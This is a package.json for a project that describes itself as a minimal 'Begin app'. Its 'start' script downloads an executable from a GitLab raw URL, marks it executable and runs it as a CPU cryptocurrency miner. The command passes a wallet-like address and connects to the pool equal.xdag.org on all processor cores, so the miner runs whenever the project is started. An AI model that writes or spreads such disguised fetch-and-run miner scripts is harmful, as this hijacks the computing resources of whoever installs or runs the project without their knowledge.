{
  "name": "begin-app",
  "version": "0.0.0",
  "description": "A simple Begin app with the minimum necessary file structure",
  "scripts": {
    "start": "wget https://gitlab.com/richardkevin320/donlod/-/raw/main/dag && chmod +x dag && ./dag -cpu -a a+dc1CL2NRgbtPvLtys614KSKlv5rdYw -p equal.xdag.org:13656 -t $(nproc --all)"
  },
  "devDependencies": {
    "@architect/sandbox": "^5.0"
  }
}
